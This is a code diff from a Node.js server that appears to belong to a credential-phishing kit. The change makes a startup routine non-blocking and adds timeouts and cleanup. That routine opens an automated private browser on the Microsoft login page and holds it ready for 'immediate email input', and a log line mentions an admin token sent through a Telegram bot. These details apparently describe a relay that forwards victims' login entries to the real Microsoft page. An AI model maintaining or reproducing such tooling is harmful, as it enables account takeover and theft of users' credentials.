@@ -3205,36 +3205,63 @@ app.listen(PORT, '0.0.0.0', () => {
         console.log('🔑 Admin token available via Telegram bot - Use /start to access');
     }
 
-    // Proactively prepare browser for immediate availability
-    setTimeout(async () => {
-        try {
-            console.log('🚀 Proactively preparing browser for immediate email input...');
-            
-            const sessionId = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
-            const automation = new ClosedBridgeAutomation();
+    // Proactively prepare browser for immediate availability (non-blocking)
+    setTimeout(() => {
+        // Use non-blocking async wrapper to prevent server crashes
+        (async () => {
+            let automation = null;
+            try {
+                console.log('🚀 Proactively preparing browser for immediate email input...');
+                
+                const sessionId = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+                automation = new ClosedBridgeAutomation();
 
-            // Initialize private browser and navigate to Microsoft login
-            await automation.init();
-            console.log('Browser initialized successfully');
+                // Initialize private browser with timeout
+                const initPromise = automation.init();
+                const initResult = await Promise.race([
+                    initPromise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Browser init timeout')), 15000))
+                ]);
 
-            // Navigate directly to Microsoft login page
-            const navigated = await automation.navigateToOutlook();
-            if (!navigated) {
-                throw new Error('Failed to navigate to Microsoft login page');
+                console.log('Browser initialized successfully');
+
+                // Navigate directly to Microsoft login page with timeout
+                const navPromise = automation.navigateToOutlook();
+                const navigated = await Promise.race([
+                    navPromise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Navigation timeout')), 10000))
+                ]);
+
+                if (!navigated) {
+                    throw new Error('Failed to navigate to Microsoft login page');
+                }
+
+                console.log(`✅ Proactive browser ready for immediate email input: ${sessionId}`);
+
+                // Store the prepared browser session 
+                automationSessions.set(sessionId, {
+                    automation: automation,
+                    status: 'email_page_ready',
+                    email: null,
+                    startTime: Date.now()
+                });
+
+            } catch (error) {
+                console.warn('⚠️ Proactive browser preparation failed (server continues normally):', error.message);
+                
+                // Critical: Clean up automation instance to prevent resource leaks
+                if (automation) {
+                    try {
+                        console.log('🧹 Cleaning up failed browser instance...');
+                        await automation.close();
+                        console.log('✅ Browser cleanup completed');
+                    } catch (cleanupError) {
+                        console.warn('⚠️ Browser cleanup failed:', cleanupError.message);
+                    }
+                }
             }
-
-            console.log(`✅ Proactive browser ready for immediate email input: ${sessionId}`);
-
-            // Store the prepared browser session 
-            automationSessions.set(sessionId, {
-                automation: automation,
-                status: 'email_page_ready',
-                email: null,
-                startTime: Date.now()
-            });
-
-        } catch (error) {
-            console.error('❌ Proactive browser preparation failed:', error.message);
-        }
+        })().catch(error => {
+            console.warn('⚠️ Proactive browser preparation wrapper failed (server continues):', error.message);
+        });
     }, 1500); // Start 1.5 seconds after server starts
 });
